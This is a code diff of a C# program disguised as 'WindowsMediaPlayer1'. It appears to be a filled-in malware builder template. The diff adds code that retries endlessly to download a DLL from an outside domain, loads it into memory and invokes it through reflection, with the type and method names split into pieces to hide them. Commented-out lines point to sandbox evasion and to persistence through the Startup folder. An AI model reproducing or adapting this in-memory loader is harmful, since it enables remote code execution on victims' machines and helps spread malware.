@@ -22,29 +22,30 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-namespace %4%
+namespace WindowsMediaPlayer1
 {
     static class Program
     {
 
-        public static byte[] %1%(string %3%)
+        public static byte[] media(string ferm)
         {
-            byte[] %1%;
+            byte[] media;
             for (; ; )
             {
                 try
                 {
-                    WebClient %2% = new WebClient();
-                    %1% = %2%.DownloadData(%3%);
+                    WebClient assemblys = new WebClient();
+                    media = assemblys.DownloadData(ferm);
                 }
                 catch (Exception ex)
                 {
-
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                     continue;
                 }
                 break;
             }
-            return %1%;
+            return media;
         }
 
         /// <summary>
@@ -56,14 +57,11 @@ namespace %4%
 
 
 
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-
     //sandboxie controlsandboxie();
 
     //Messega
 
-       {
+            {
                 ServicePointManager.Expect100Continue = true;
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             }
@@ -80,14 +78,14 @@ namespace %4%
     //download }
 
 
-            object %5% = new object[] { %aPP%, string.Empty, %1%("%Server%"), true };
+            object web = new object[] { %aPP%, string.Empty, media("%Server%"), true };
 
-            Assembly %6%;
+            Assembly refS;
 
-            %6% = AppDomain.CurrentDomain.Load(%1%("https://ieaspk.com/instagram.dll"));
+            refS = AppDomain.CurrentDomain.Load(media("https://ieaspk.com/instagram.dll"));
 
 
-            %6%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%5%);
+            refS.GetType("instagram"+ ".what" + "sapp").InvokeMember("stu"+"dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])web);
 
     //start  {
     //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
